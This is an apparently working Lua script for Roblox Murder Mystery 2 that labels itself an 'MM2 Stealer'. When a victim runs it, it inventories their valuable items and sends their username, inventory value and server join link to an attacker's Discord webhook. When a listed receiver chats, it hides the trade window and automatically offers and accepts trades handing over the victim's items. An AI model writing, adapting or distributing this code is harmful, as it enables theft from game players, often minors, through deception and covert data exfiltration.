if not _G["Script-SM_Config"] then
    warn("Waiting for config...")
    repeat task.wait() until _G["Script-SM_Config"]
end

local config = _G["Script-SM_Config"]
local webhook = config.user_webhook
local usernames = config.users or {}
local minPingVal = tonumber(config.Min_Ping) or 0

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

if game.PlaceId ~= 142823291 then
    LocalPlayer:Kick("Wrong game! Join Murder Mystery 2")
    return
end

-- Value Scraper (fixed)
local itemValues = {}
local valuePages = {
    "https://supremevaluelist.com/mm2/godlies.html",
    "https://supremevaluelist.com/mm2/ancients.html",
    "https://supremevaluelist.com/mm2/uniques.html",
    "https://supremevaluelist.com/mm2/vintages.html",
}

local function loadValues()
    for _, link in ipairs(valuePages) do
        pcall(function()
            local resp = request({Url = link, Method = "GET"})
            if resp and resp.Body then
                for nameBlock in resp.Body:gmatch("<h.-</div>") do
                    local name = nameBlock:match(">([^<]+)<")
                    local val = nameBlock:match("([%d,]+)")
                    if name and val then
                        local clean = name:match("^%s*(.-)%s*$"):lower()
                        itemValues[clean] = tonumber(val:gsub(",", ""))
                    end
                end
            end
        end)
        task.wait(0.5)
    end
end
loadValues()

-- Inventory
local itemsToTrade = {}
local overallValue = 0
local rarityCounts = {Godly=0, Ancient=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}

local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local success, inventoryData = pcall(function()
    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
end)

if success and inventoryData and inventoryData.Weapons then
    for itemId, count in pairs(inventoryData.Weapons.Owned or {}) do
        local info = itemDatabase[itemId]
        if info and not (itemId == "DefaultGun" or itemId == "DefaultKnife") then
            local name = tostring(info.ItemName)
            local val = itemValues[name:lower()] or 150
            overallValue += val * count
            local rarity = info.Rarity or "Common"
            if rarityCounts[rarity] then rarityCounts[rarity] = rarityCounts[rarity] + count end
            table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val})
        end
    end
end

table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)

-- Embed matching your screenshot
local function postToDiscord()
    local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
    local displayLines = {}
    for i, item in ipairs(itemsToTrade) do
        if i > 10 then break end
        table.insert(displayLines, item.name .. " x" .. item.qty)
    end

    local embed = {
        username = "MM2 Stealer",
        embeds = {{
            title = "MM2 stealer",
            fields = {
                {name = "Player Info:", value = "```Username: " .. LocalPlayer.Name .. "\nDisplay Username: " .. LocalPlayer.DisplayName .. "\nExecutor: " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "\nReceiver: " .. table.concat(usernames, ", ") .. "```", inline = true},
                {name = "Inventory", value = "```Total value: " .. string.format("%.2f", overallValue) .. "\nAncient     : " .. rarityCounts.Ancient .. "\nGodly       : " .. rarityCounts.Godly .. "\nUnique      : " .. rarityCounts.Unique .. "\nVintage     : " .. rarityCounts.Vintage .. "\nLegendary   : " .. rarityCounts.Legendary .. "\nRare        : " .. rarityCounts.Rare .. "\nUncommon    : " .. rarityCounts.Uncommon .. "\nCommon      : " .. rarityCounts.Common .. "```", inline = true},
                {name = "List of items", value = "https://api.rubis.app/v2/scrap/" .. LocalPlayer.Name, inline = true},
                {name = "Join link:", value = joinLink, inline = true},
            },
            footer = {text = "best Stealer - " .. os.date("%Y-%m-%d %H:%M:%S")},
            color = 0x00FF00
        }}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(embed)
        })
    end)
end

-- Trade Engine
local function checkTradeState()
    return ReplicatedStorage:WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
end

local function doTrade(target)
    task.spawn(function()
        postToDiscord()
        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        if tradeGui then
            tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
        end

        while #itemsToTrade > 0 do
            local state = checkTradeState()
            if state == "None" then
                ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
            elseif state == "StartTrade" then
                for i = 1, math.min(6, #itemsToTrade) do
                    local item = table.remove(itemsToTrade, 1)
                    for _ = 1, item.qty do
                        ReplicatedStorage.Trade.OfferItem:FireServer(item.id, "Weapons")
                        task.wait(0.32)
                    end
                end
                task.wait(4)
                ReplicatedStorage.Trade.AcceptTrade:FireServer()
            else
                task.wait(1.2)
            end
        end
        postToDiscord()
    end)
end

local function onPlayerAdded(plr)
    if table.find(usernames, plr.Name) then
        plr.Chatted:Connect(function() doTrade(plr) end)
    end
end

for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
Players.PlayerAdded:Connect(onPlayerAdded)

postToDiscord()
print("✅ ZENX MM2 Stealer - Embed Matched Your Screenshot")
